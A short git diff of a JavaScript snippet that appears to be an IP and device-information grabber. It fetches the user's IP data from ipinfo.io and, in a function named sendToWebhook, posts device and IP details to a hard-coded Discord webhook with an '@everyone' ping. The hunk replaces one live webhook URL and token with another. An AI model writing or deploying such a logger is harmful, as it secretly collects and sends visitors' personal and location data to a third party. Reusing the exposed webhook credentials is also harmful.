@@ -20,7 +20,7 @@ fetch("https://ipinfo.io/json")
 
 function sendToWebhook(deviceInfo, ipInfo) {
   const webhookUrl =
-    "https://discord.com/api/webhooks/1177160730802397286/QwXZA5a39JuPEG2caGGZBuEJamEh9uP6tiVmL936lDtiEolAiDM_3JQUwajr-YgCW8Pr";
+    "https://discord.com/api/webhooks/1194336711451357365/8OVLYvBKfpdtXVS8KNvs5DJeYMHWBGUlNTTGQxpQvozOo8Euhx76kAt-wYkLcQDvELGf";
   const data = {
     content: "||@everyone||",
     embeds: [
